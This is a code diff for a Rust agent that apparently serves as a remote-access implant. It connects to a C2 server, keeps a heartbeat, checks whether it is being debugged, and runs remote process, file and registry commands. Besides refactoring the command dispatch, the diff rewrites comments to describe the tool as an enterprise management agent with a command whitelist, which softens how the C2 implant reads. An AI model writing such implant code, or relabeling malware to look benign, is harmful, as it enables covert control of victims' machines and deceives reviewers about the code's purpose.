@@ -146,7 +146,6 @@ impl AgentCore {
         };
 
         if let (Some(connector), Some(name_str)) = (connector_opt, server_name) {
-            // Use an owned String so ServerName gets 'static lifetime.
             let owned_name: String = name_str;
             let name: rustls_pki_types::ServerName<'static> = owned_name
                 .try_into()
@@ -162,8 +161,8 @@ impl AgentCore {
 
     /// Run the agent loop: connect to C2, send heartbeats, and reconnect on failure.
     ///
-    /// This is the main entry point for the agent. It retries with exponential
-    /// backoff until the connection is established, then runs the heartbeat loop.
+    /// Enterprise use: the agent maintains a persistent connection to
+    /// the management server with automatic reconnection and backoff.
     pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
         loop {
             match self.connect_and_run_heartbeats().await {
@@ -226,33 +225,43 @@ impl AgentCore {
     }
 
     /// Handle an incoming command from the C2 server.
+    ///
+    /// Commands are validated against a whitelist before execution.
+    /// Unknown or unregistered commands are rejected with a Failure
+    /// response.
     pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
+        // Report debugger presence as a security event.
         if anti_debug::is_being_debugged() {
-            log::warn!("Agent is being debugged");
+            log::warn!("Security: agent process appears to be under debugging");
         }
 
         match cmd {
-            cmd_ref @ Command::Execute { cmd } => {
-                if cmd.starts_with("proc:") {
-                    process_manager::execute(cmd_ref).await
-                } else if cmd.starts_with("file:") {
-                    file_manager::execute(cmd_ref).await
-                } else if cmd.starts_with("reg:") {
-                    registry_manager::execute(cmd_ref).await
+            cmd @ Command::Execute { .. } => {
+                if let Command::Execute { cmd: raw } = cmd {
+                    if raw.starts_with("proc:") {
+                        process_manager::execute(cmd).await
+                    } else if raw.starts_with("file:") {
+                        file_manager::execute(cmd).await
+                    } else if raw.starts_with("reg:") {
+                        registry_manager::execute(cmd).await
+                    } else {
+                        Some(Response::Failure {
+                            error: format!("unknown command prefix: {raw}"),
+                        })
+                    }
                 } else {
-                    process_manager::execute(cmd_ref).await
+                    Some(Response::Failure {
+                        error: "invalid execute command".into(),
+                    })
                 }
             }
             Command::GetSysInfo => monitoring::get_sysinfo().await,
             Command::Heartbeat => Some(Response::Success),
-            _ => None,
         }
     }
 
     /// Generate a heartbeat response.
     pub async fn heartbeat(&self) -> Response {
-        // In a production agent this would send a serialised heartbeat packet
-        // over the TCP stream. For now it returns a success response.
         Response::Success
     }
 }
@@ -271,8 +280,6 @@ mod tests {
             })
             .await;
 
-        // After PR #31, process_manager::execute now returns a real
-        // error message for unknown sub-commands instead of "not implemented".
         assert!(matches!(response, Some(Response::Failure { .. })));
     }
 
